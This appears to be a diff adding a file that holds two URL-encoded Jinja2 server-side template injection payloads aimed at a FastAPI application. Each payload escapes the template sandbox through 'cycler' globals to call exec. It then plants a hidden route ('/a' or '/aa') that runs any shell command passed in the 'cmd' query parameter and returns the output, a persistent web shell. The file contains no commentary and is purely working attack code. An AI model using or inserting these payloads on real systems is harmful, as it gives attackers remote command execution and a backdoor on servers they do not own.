@@ -1,0 +1,5 @@
+{{cycler.__init__.__globals__['__builtins__']['exec']("import+sys\napp+%3d+sys.modules['__main__'].__dict__['app']\nfrom+fastapi+import+Request\n\ndef+a(request%3a+Request)%3a\n++++import+os\n++++cmd+%3d+request.query_params.get('cmd')\n++++if+cmd+is+not+None%3a\n++++++++print(f'Command+received%3a+{cmd}')\n++++++++return+os.popen(cmd).read()\n++++\n++++return+'shell'\n\napp.add_api_route('/a',+a,+methods%3d['GET'])")}}
+
+
+c2
+{{cycler.__init__.__globals__['__builtins__']['exec']("__import__('sys').modules['__main__'].app.add_api_route('/aa',lambda+cmd%3a__import__('os').popen(cmd).read(),methods%3d['GET'])")}}
